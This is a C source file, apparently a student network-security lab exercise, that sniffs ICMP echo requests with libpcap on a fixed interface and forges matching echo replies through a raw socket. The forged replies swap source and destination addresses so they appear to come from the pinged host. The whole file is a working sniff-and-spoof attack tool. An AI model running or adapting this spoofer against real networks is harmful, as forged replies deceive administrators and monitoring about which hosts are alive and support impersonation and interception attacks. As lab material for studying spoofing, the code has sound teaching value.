#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <ctype.h>
#include <stdlib.h>

struct ipheader {
	unsigned char      iph_ihl:4;
	unsigned char	   iph_ver:4;
	unsigned char      iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
	unsigned short int iph_flag:3;
	unsigned short int iph_offset:13;
	unsigned char      iph_ttl;
	unsigned char	   iph_protocol;
	unsigned short int iph_chksum;
	struct   in_addr   iph_sourceip;
	struct   in_addr   iph_destip;  
};

struct icmpheader  {
	unsigned char icmp_type;
	unsigned char icmp_code;
	unsigned short int icmp_chksum;
	unsigned short int icmp_id;
	unsigned short int icmp_seq;
};

struct ethheader {
	u_char ether_dhost[6];
	u_char ether_shost[6];
	u_short ether_type;
};

void send_raw_ip_packet(struct ipheader* ip) {
	struct sockaddr_in dest_info;
	int enable = 1;

	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
			&enable, sizeof(enable));
	dest_info.sin_family = AF_INET;
	dest_info.sin_addr = ip ->iph_destip;

	sendto(sock, ip, ntohs(ip->iph_len), 0, 
		(struct sockaddr*)&dest_info, sizeof(dest_info));
	close(sock);	
}

unsigned short in_cksum(unsigned short *buf, int length)
{
	unsigned short *w = buf;
	int nleft = length;
 	int sum = 0;
	unsigned short temp = 0;

	while (nleft > 1) {
	sum += *w++;
	nleft -= 2;
	}
	
	if(nleft == 1) {
 	*(u_char *)(&temp) = *(u_char *)w;
	sum +=temp;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

/* step 2 spoof the reply packet when the request packet is received*/
void spoof_icmp_reply(struct ipheader* ip)
{	
	//create the buffer to store the contentst of the packet
	const char buffer[1500];
	int ip_header_len = ip->iph_ihl * 4;
	//use the typecasting technique from the textbook
	struct icmpheader* icmp = (struct icmpheader *) ((u_char *)ip + ip_header_len);
	//check to make sure that this isn't a echo reply 8 for request, 0 for reply
	if(icmp->icmp_type!=8) {
	    printf("''Not an echo Request\n");
	    return;
	}
	
	memset((char*)buffer, 0, 1500);
	memcpy((char*)buffer, ip, ntohs(ip->iph_len));
	struct ipheader* newip = (struct ipheader*)buffer;
	struct icmpheader* newicmp = (struct icmpheader *)((u_char *)buffer + ip_header_len);

	newip->iph_sourceip = ip->iph_destip;
	newip->iph_destip = ip->iph_sourceip;
	newip->iph_ttl = 20;
	newicmp->icmp_type = 0;

	newicmp->icmp_chksum = 0;
	newicmp->icmp_chksum = in_cksum((unsigned short*)newicmp, ntohs(ip->iph_len) - ip_header_len);

	send_raw_ip_packet(newip);
	
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,
		const u_char *packet)
{
	
	struct ethheader *eth = (struct ethheader *)packet;
	//check whether packet isn't an ip packet
	if (eth->ether_type != ntohs(0x0800))   return;

	struct ipheader * ip = (struct ipheader *)(packet + sizeof(struct ethheader));
	int ip_header_len = ip->iph_ihl * 4;

	printf("---------------------------------------\n");	

	printf(" 	From: %s,", inet_ntoa(ip->iph_sourceip));
	printf(" 	TO: %s,", inet_ntoa(ip->iph_destip));
	//check to ensure that the field iph_protocol in the ipheader struct == IPPROTO_ICMP
	if (ip->iph_protocol == IPPROTO_ICMP) {
	     printf("	Protocol: ICMP\n");
	     spoof_icmp_reply(ip);
	}
}

int main()
{
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "icmp[icmptype] = 8";
	bpf_u_int32 net;
	
	handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);

	if (handle == NULL)
	{
	printf("%s\n", errbuf);
	exit(EXIT_FAILURE);
	}

	int check_value;
	check_value = pcap_compile(handle, &fp, filter_exp, 0, net);
	if (check_value == -1)
	{
	printf("%s\n", pcap_geterr(handle));
	exit(EXIT_FAILURE);
	}

	check_value = pcap_setfilter(handle, &fp);
	if (check_value == -1)
	{
	printf("%s\n", pcap_geterr(handle));
	exit(EXIT_FAILURE);
	}
	
	check_value = pcap_loop(handle, -1, got_packet, NULL);
	if (check_value == -1)
	{
	printf("%s\n", pcap_geterr(handle));
	exit(EXIT_FAILURE);
	}
	
	pcap_close(handle);
	return 0;

}

